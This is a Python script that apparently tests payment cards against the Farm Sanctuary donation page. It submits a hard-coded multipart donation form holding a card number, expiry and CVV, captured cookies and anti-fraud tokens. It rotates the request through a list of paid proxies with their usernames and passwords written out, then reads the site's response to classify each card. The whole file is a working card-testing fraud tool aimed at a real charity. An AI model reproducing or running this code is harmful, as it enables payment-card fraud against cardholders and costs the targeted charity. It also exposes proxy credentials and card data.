import requests
import json
import random
import string
import threading
# Optimized mail generation function
def generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "vyy.eu"]
    email_prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{email_prefix}@{random.choice(domains)}"
proxies = [
    "198.23.239.134:6540:uspyjhzt:9tu1igat8is9",
    "207.244.217.165:6712:uspyjhzt:9tu1igat8is9",
    "107.172.163.27:6543:uspyjhzt:9tu1igat8is9",
    "64.137.42.112:5157:uspyjhzt:9tu1igat8is9",
    "173.211.0.148:6641:uspyjhzt:9tu1igat8is9",
    "161.123.152.115:6360:uspyjhzt:9tu1igat8is9",
    "23.94.138.75:6349:uspyjhzt:9tu1igat8is9",
    "154.36.110.199:6853:uspyjhzt:9tu1igat8is9",
    "173.0.9.70:5653:uspyjhzt:9tu1igat8is9",
    "173.0.9.209:5792:uspyjhzt:9tu1igat8is9"
]
# Optimized function to extract a substring between two delimiters
def find_between(data, first, last):
    start = data.find(first)
    if start == -1:
        return None
    start += len(first)
    end = data.find(last, start)
    return data[start:end] if end != -1 else None

# Session for making requests
session = requests.Session()


data = """------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[donation][recurs_monthly]"

NO_RECURR
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[donation][amount]"

100
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[donation][other_amount]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[donation][recurring_amount]"

25
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[donation][recurring_other_amount]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[donor_information][first_name]"

soifhasdoih
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[donor_information][last_name]"

oifhaoidh
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[donor_information][mail]"

iofhasd@gmail.com
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[billing_information][address]"

foiashdf
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[billing_information][address_line_2]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[billing_information][city]"

asdoifh
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[billing_information][state]"

AL
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[billing_information][zip]"

38727
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[billing_information][country]"

US
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_method]"

credit
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][card_number]"

4640182089429132
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_month]"

1
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_year]"

2027
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][card_cvv]"

881
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][card_type]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][account_name][credit]"

FARMSANCTUARY DONATION
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][radar_session]"

rse_1QsnlUD3fa3PMFmlPL4KXRqM
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="braintree[errors]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="payment_method_nonce"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][paypal][braintree_card_type]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][paypal][braintree_last4]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][routing_number]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][account_number]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][confirm_account_number]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][account_type]"

Checking
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][account_name][bank account]"

FARMSANCTUARY DONATION
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][radar_session]"

rse_1QsnlUD3fa3PMFmlPL4KXRqM
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][processing_fee_amount]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[payment_information][stripe_ach_disclaimer_text]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[ms]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[selected_ecard]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[cid]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[referrer]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[initial_referrer]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[search_engine]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[secure_prepop_autofilled]"

0
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[springboard_cookie_autofilled]"

disabled
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[content_override_id]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[search_string]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[user_agent]"

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[utm_source]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[utm_medium]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[utm_term]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[utm_content]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[utm_campaign]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[eml_name]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[eml_id]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[device_browser]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[device_name]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[device_os]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[device_type]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[social_referer_transaction]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="submitted[gs_flag]"

None
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="details[sid]"


------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="details[page_num]"

1
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="details[page_count]"

1
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="details[finished]"

0
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="form_build_id"

form-d1rH8X574_3NlqETBJzZWD3cpJ7mXtfX5SnEhhpRcR8
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="form_id"

webform_client_form_442
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="springboard_fraud_token"

lZXafYwopKkqXl1H1q0tKcTtOqcFotBvsJU9ByTchLM
------WebKitFormBoundaryLIlBB69E9N58WOgz
Content-Disposition: form-data; name="springboard_fraud_js_detect"

1
------WebKitFormBoundaryLIlBB69E9N58WOgz--"""
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'en-GB,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Content-Length': '8795',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryLIlBB69E9N58WOgz',
    'Cookie': 'cookies_enabled=1; Springboard=B4C4bemzVPKf1Bip9f8%2By1JJVKxND7d0sGbWwcOKr%2FoRk8j2YwT29Pp7j5CCr%2BDY; __stripe_mid=ce33008a-1b88-4d55-9349-eb0e2640d3d122b5de; __stripe_sid=e7bb2918-e05d-4af1-9b17-af3497d8bf65554011',
    'Origin': 'https://secure.farmsanctuary.org',
    'Priority': 'u=0, i',
    'Referer': 'https://secure.farmsanctuary.org/donate',
    'Sec-CH-UA': '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'Sec-CH-UA-Mobile': '?0',
    'Sec-CH-UA-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
}
for i in range(len(proxies)):
    # Extract the proxy information
    proxy_info = proxies[i].split(":")
    proxy = {
        "http": f"http://{proxy_info[2]}:{proxy_info[3]}@{proxy_info[0]}:{proxy_info[1]}",
        "https": f"http://{proxy_info[2]}:{proxy_info[3]}@{proxy_info[0]}:{proxy_info[1]}"
    }

    # Send the POST request with the current proxy
    try:
        response = session.post("https://secure.farmsanctuary.org/donate", data=data, headers=headers, proxies=proxy).text
        
        # Check if the error message is in the response
        if "<li>Donation transaction failed.</li>" in response:
            print(f"authnet3: success (Proxy {i+1})")
        else:
            print(f"authnet3: error (Proxy {i+1})")
            print(response)
    except Exception as e:
        print(f"Request failed for Proxy {i+1}: {e}")